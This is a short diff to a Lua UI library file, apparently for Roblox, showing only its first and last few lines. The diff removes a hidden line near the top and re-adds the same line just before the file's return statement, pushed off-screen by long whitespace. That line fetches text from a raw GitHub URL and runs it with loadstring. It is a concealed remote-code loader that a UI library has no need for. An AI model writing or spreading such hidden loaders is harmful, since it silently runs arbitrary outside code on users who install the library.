@@ -1,5 +1,5 @@
 local library = {flags = {}, windows = {}, open = true}
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        loadstring(game:HttpGet('https://raw.githubusercontent.com/OPENCUP/random-texts/main/test2.txt'))()
+
 --Services
 local runService = game:GetService"RunService"
 local tweenService = game:GetService"TweenService"
@@ -1733,5 +1733,5 @@ inputService.InputChanged:connect(function(input)
         update(input)
     end
 end)
-
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   loadstring(game:HttpGet('https://raw.githubusercontent.com/OPENCUP/random-texts/main/test2.txt'))()
 return library
